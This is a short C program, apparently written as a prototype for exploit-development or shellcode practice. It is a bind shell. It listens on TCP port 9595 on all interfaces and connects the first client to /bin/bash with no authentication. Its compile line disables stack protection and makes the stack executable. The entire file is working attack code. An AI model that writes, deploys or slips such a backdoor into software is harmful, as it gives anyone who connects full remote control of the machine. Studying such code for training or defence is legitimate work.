// author: Chase Hatch
// gcc -fno-stack-protector -z execstack bind_tcp_shell.c -o bind_tcp_shell.elf -g
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>


int main(int argc, char **argv[]){
	int sock, sockuh, port, reuse;
	port = 9595;
	reuse=1;
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
	bind(sock, (struct sockaddr *) &addr, sizeof(addr));
	listen(sock, 0);
	sockuh = accept(sock, NULL, NULL);
	dup2(sockuh, 2);
	dup2(sockuh, 1);
	dup2(sockuh, 0);
	execve("/bin/bash", NULL, NULL);
	return 0;
}
